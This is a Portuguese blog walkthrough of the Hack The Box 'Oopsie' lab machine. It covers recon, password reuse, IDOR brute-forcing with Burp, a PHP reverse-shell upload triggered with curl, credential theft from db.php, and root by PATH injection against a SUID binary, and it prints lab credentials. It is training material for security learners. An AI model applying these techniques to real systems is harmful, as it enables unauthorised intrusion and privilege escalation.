---
title: HTB Oopsie Writeup
author: Hastur
date: 2021-09-05 21:00:00 -0300
categories: [Writeups, Hack The Box]
tags: [HTB, Starting point, Linux, Very Easy, Web, Path Injection]
image: /img/htb/htb-oopsie-logo.png
alt: "HTB Oopsie Writeup"
---

<img src="/img/htb/htb-oopsie-logo.png">

<br>


| Nome | Oopsie      |
|------|-------------|
|IP    | 10.10.10.28 |
|Pontos| 0           |
|OS    | Linux       |
|Nível | Very Easy   |

<br>

## RECON

### Nmap
```bash
┌──(hastur㉿hastur)-[~/Oopsie]
└─$ sudo nmap -v -sCV -p- -Pn -O 10.10.10.28 --min-rate=512
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)
|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)
|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Welcome

```
Encontramos somente as portas 22 e 80 abertas. Vamos começar pela porta 80.

### Porta 80

<img src="/img/htb/htb-oopsie-1.png">

Apenas uma página simples sem links para seguir.

Aparentemente uma página sobre uma fábrica de vaículos elétricos cahamada `"MegaCorp"`, coincidentemente, a senha do administrador da=o host `Archetype`, era `MEGACORP_4dm1n!!`.

Porém, no rodapé da página encontramos um e-mail de contato que pode ser útil.

<img src="/img/htb/htb-oopsie-2.png">

Vamos rodar o `gobuster` para enumerar os diretórios.

```bash
┌──(hastur㉿hastur)-[~/Oopsie]
└─$ gobuster dir -e -u http://10.10.10.28/ -w /usr/share/wordlists/dirb/common.txt -r
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.28/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Follow Redirect:         true
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2021/09/05 18:09:37 Starting gobuster in directory enumeration mode
===============================================================
http://10.10.10.28/.htpasswd            (Status: 403) [Size: 276]
http://10.10.10.28/.hta                 (Status: 403) [Size: 276]
http://10.10.10.28/.htaccess            (Status: 403) [Size: 276]
http://10.10.10.28/css                  (Status: 403) [Size: 276]
http://10.10.10.28/fonts                (Status: 403) [Size: 276]
http://10.10.10.28/images               (Status: 403) [Size: 276]
http://10.10.10.28/index.php            (Status: 200) [Size: 10932]
http://10.10.10.28/js                   (Status: 403) [Size: 276]  
http://10.10.10.28/server-status        (Status: 403) [Size: 276]  
http://10.10.10.28/themes               (Status: 403) [Size: 276]  
http://10.10.10.28/uploads              (Status: 403) [Size: 276]  
                                                                   
===============================================================
2021/09/05 18:11:12 Finished
===============================================================

```

O mais interassante que encontramos, foi o diretório `uploads`.

Vamos interceptar a requisição para a página com o `BURP`.

<img src="/img/htb/htb-oopsie-3.png">

Encontramos o diretório `http://10.10.10.28/cdn-cgi/login/` que nos leva para uma página de login.

<img src="/img/htb/htb-oopsie-4.png">

Antes de tentar qualquer técnica para tentar bypass ou bruteforce, vamos tentar o usuário `admin` que encontramos na página principal e a sena `MEGACORP_4dm1n!!` que descobrimos na [Archetype](https://hastur666.github.io/posts/htb-archetype-writeup/).

<img src="/img/htb/htb-oopsie-5.png">

Ótimo, conseguimos nos autenticar, vamos fazer a nova enumeração.

Em `Accounts` vemos informações de Access ID do nosso usuário, e um parâmetro `id` na url.

<img src="/img/htb/htb-oopsie-6.png">

Em `Uploads`, vemos uma tela sem permissão, a página diz que precisamos de permissão de `"super user"` para acessarmos.

<img src="/img/htb/htb-oopsie-7.png">

Vamos utilizar o burp na tela Accounts, e verificar se conseguimos enumerar algum usuário com o BURB.

Primeiro, interceptamos a requisição para a página Accounts com o BURP e o enviamos para o `Intruder`, em seguida, limpamos as posições de parâmetros e inserimos somente em `id`.

<img src="/img/htb/htb-oopsie-8.png">

Em `Payloads`, vamos configurar para uma lista nuérica de 1 a 100 para tentarmos bruteforce do parâmetro ID.

<img src="/img/htb/htb-oopsie-9.png">

Agora podemos iniciar o ataque.

<img src="/img/htb/htb-oopsie-10.png">

Com ID 30 a Access ID 86575 conseguimos as informações do `super admin`, podemos interceptar a requisição da página `Uploads` com o BURP e manipular estas informações ma requisição.

<img src="/img/htb/htb-oopsie-11.png">

E conseguimos acesso à pagina de uploads.

<img src="/img/htb/htb-oopsie-12.png">

Como vimos na URL que se trata de PHP, podemos inserir um reverse shell em PHP, a própria distribuição Kali, possui exemplos de reverse shell no diretório `/usr/share/webshells/php/`.

Vamos copiar um deles com o nome `shell.php`.

```bash
┌──(hastur㉿hastur)-[~/Oopsie]
└─$ cp /usr/share/webshells/php/php-reverse-shell.php ./shell.php

```
E atualizar o IP e PORTA para nossas configurações de acordo com a VPN do Hack The Box.

<img src="/img/htb/htb-oopsie-13.png">

Com o arquivo configurado, vamos setar o `netcat` para ouvir na porta 8443 que setamos no reverse shell e fazer upload do arquivo.

<img src="/img/htb/htb-oopsie-14.png">

Note, que precisamos interceptar o upload com o BURP para manipular o Access ID.

<img src="/img/htb/htb-oopsie-15.png">

E conseguimos o upload com sucesso.

<img src="/img/htb/htb-oopsie-16.png">

Como já identificamos o diretório `uploads` com o gobuster, podemos fazer um curl para nosso shell.php e verificar nosso netcat.

```bash
┌──(hastur㉿hastur)-[~/Oopsie]
└─$ curl http://10.10.10.28/uploads/shell.php
```

E conseguimos nosso shell.

<img src="/img/htb/htb-oopsie-17.png">

Porém estamos num shell com o usuário `www-data` que basicamente não tem privilégios, precisamos de uma escalação de privilégios horizontal para tentarmos uma exploração mais efetiva.

No diretório `/home` vemos somente um usuário:

```bash
www-data@oopsie:/home$ ls -la
ls -la
total 12
drwxr-xr-x  3 root   root   4096 Jan 23  2020 .
drwxr-xr-x 24 root   root   4096 Jan 27  2020 ..
drwxr-xr-x  5 robert robert 4096 Feb 25  2020 robert
```
Após enumerar vários diretórios, encontrei um arquivo interessante em `/var/www/html/cdn-cgi/login`.

<img src="/img/htb/htb-oopsie-18.png">

Ao ler o conteúdo do arquivo `db.php`, encontramos as credenciais do usuário robert.

<img src="/img/htb/htb-oopsie-19.png">

Com as credenciais do `robert`, podemos tentar trocar de usuário.

<img src="/img/htb/htb-oopsie-20.png">

Conseguimos acesso com o usuário robert!!

A flag do usuário se encontra em seu diretório.

<img src="/img/htb/htb-oopsie-21.png">

Enumerando o usuário, percebemos que ele faz parte do grupo `bugtracker`.

```bash
robert@oopsie:~$ id
id
uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
```

Fazendo enumeração local com um usuário com maiores privilégios que o anterior, encontramos um binário com permissões de execussão para o grupo `bugtracker`.

```bash
robert@oopsie:~$ find / -type f -group bugtracker 2>/dev/null
find / -type f -group bugtracker 2>/dev/null
/usr/bin/bugtracker
```

Ao enumerar as permissões do binário, perccebemos que ele executa como `root`.

```bash
robert@oopsie:/tmp$ ls -la /usr/bin/bugtracker
ls -la /usr/bin/bugtracker
-rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker
```

Ao executar o binário, ele nos pede um ID de Bug, e em seguida continua sua execução.

<img src="/img/htb/htb-oopsie-22.png">

Vamos utilizar o comando `strings` para tentar enumerar algumas informaçoes sobre o binário.

<img src="/img/htb/htb-oopsie-23.png">

Percebemos que em determinado momento, o binário usa a função `cat` do SO em algum arquivo, o que nos dá a oportunidade de tentar `PATH INJECTION`.

## Escalação de privilégios

Primeiro vamos criar um arquivo `cat` no diretório `/tmp` contendo o comando `/bin/bash`.

```bash
robert@oopsie:/tmp$ echo '/bin/bash' > cat
echo '/bin/bash' > cat
robert@oopsie:/tmp$ ls -la
ls -la
total 12
drwxrwxrwt  2 root     root     4096 Sep  5 22:49 .
drwxr-xr-x 24 root     root     4096 Jan 27  2020 ..
-rwxrwxrwx  1 robert   robert   10 Sep  5 22:49 cat

```

Em seguida damos permissão total de execução para o arquivo.

```bash
robert@oopsie:/tmp$ chmod +x cat
```

Em seguida, adicionamos o diretório `/tmp` no PATH do SO.

```bash
robert@oopsie:/tmp$ export PATH=/tmp:$PATH
```
Agora ao executar o binário, quando ele chamar a função `cat`, ele irá executar o arquivo que criamos em `/tmp`. Como o dono do arquivo é `root`, ele irá executar `/bin/bash` com privilégios administrativos.

<img src="/img/htb/htb-oopsie-24.png">

E conseguimos nosso shell com root!!

A flag root está em seu diretório.

## Pós exploração

Após conseguir root, em seu próprio diretório, conseguimos encontrar alguns arquivos e diretórios.

Dentro de `/root/.config/filezilla`, encontramos o arquivo `filezilla.xml`.

Ao verificar seu conteúdo, vemos uma nova credencial:

<img src="/img/htb/htb-oopsie-25.png">

Temos as credenciais `ftpuser:mc@F1l3ZilL4<`, como aproveitamos as credenciais da máquina anterior (Arquetype), ttalvez seja uma informação interessante para as próximas máquinas.


E comprometemos o server!!
<br>

<img src="/img/htb/hackerman.gif">
<br>



